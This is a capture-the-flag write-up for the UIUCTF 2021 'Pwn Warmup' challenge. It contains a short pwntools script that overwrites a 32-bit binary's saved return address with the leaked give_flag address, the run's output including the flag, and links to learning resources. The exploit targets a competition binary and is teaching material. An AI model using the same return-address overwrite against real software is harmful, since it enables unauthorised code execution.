# Pwn Warmup(UIUCTF 2021)
```
Points - 50	Number of solves - 214

Hmm this time we arent just going to give you the flag like last year... What can you do?!

nc pwn-warmup.chal.uiuc.tf 1337 

author: Thomas

attachments: pwn-warmup
```

We try to connect to the given server instance using netcat.
```bash
$ nc pwn-warmup.chal.uiuc.tf 1337
== proof-of-work: disabled ==
This is pwn_warmup, go
&give_flag = 0x565612ad
^C
```
Hmm.. this really seems to be a warmup challenge. By the looks of the address, it looks like 32-bit binary. So, I just wrote this simple script to send back this address in hope of overwriting the saved return address on stack:
```python
from pwn import *

target = remote("pwn-warmup.chal.uiuc.tf", 1337)

target.recvuntil("&give_flag = ")

give_flag = int(target.recvline().strip('\n'), 0x10)

target.sendline(p32(give_flag)*20)

target.interactive()
```
```bash
$ python exploit.py 
[+] Opening connection to pwn-warmup.chal.uiuc.tf on port 1337: Done
[*] Switching to interactive mode
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to pwn-warmup.chal.uiuc.tf port 1337
```
And bingo, it really worked right away. _k3b0ard_sp@m_st1ll_w0rks_ haha

For those who are new to this, `p32(addr32)` converts 32-bit value `addr32` to its ascii representation as string.
For example, p32(0x41424344) gives "\x44\x43\x42\x41". Other function names are indicative of what they do.

If you are reading this writeup, these are few resources that might be helpful to you:

## Resources
[Nightmare](https://github.com/guyinatuxedo/nightmare)

[Intro-X86](https://opensecuritytraining.info/IntroX86.html)

[Exploits1](https://opensecuritytraining.info/Exploits1.html)

[pwn.college](https://pwn.college/)
